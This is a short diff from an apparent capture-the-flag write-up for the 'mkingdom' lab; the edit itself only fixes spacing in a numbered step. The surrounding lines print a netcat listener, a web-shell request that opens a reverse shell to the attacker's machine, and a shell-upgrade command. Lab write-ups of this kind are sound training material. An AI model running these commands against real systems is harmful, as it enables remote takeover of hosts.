@@ -95,7 +95,7 @@ nc -lnvp 4444
 ```bash
 curl 'http://mkingdom.thm:85/app/castle/application/files/9817/6188/7568/cmd.php?cmd=busybox%20nc%2010.9.1.13%204444%20-e%20bash'
 ```
-   3.     Upgrade shell for better interaction: 
+   3. Upgrade shell for better interaction: 
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
